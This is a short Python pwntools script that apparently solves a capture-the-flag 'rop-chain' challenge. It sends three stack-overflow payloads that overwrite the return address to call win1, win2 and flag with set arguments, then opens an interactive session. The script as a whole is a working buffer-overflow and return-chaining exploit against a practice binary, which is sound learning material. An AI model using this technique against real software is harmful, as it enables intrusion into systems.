#!/usr/bin/env python2
from pwn import *
from struct import pack,unpack
win1 = 0x080485CB
win2 = 0x080485D8
arg2 = 0xBAAAAAAD
flag = 0x0804862B
flag_arg = 0x0DEADBAAD
vuln = 0x08048714
r = process("/problems/rop-chain_2_d25a17cfdcfdaa45844798dd74d03a47/rop")
r.sendline("AAAABBBBCCCCDDDDEEEEFFFFGGGG%s%s"%(struct.pack("<I",win1),struct.pack("<I",vuln)))
r.sendline("AAAABBBBCCCCDDDDEEEEFFFFGGGG%s%s%s"%(struct.pack("<I",win2),struct.pack("<I",vuln),struct.pack("<I",arg2)))
r.sendline("AAAABBBBCCCCDDDDEEEEFFFFGGGG%s%s%s"%(struct.pack("<I",flag),struct.pack("<I",vuln),struct.pack("<I",flag_arg)))
r.interactive()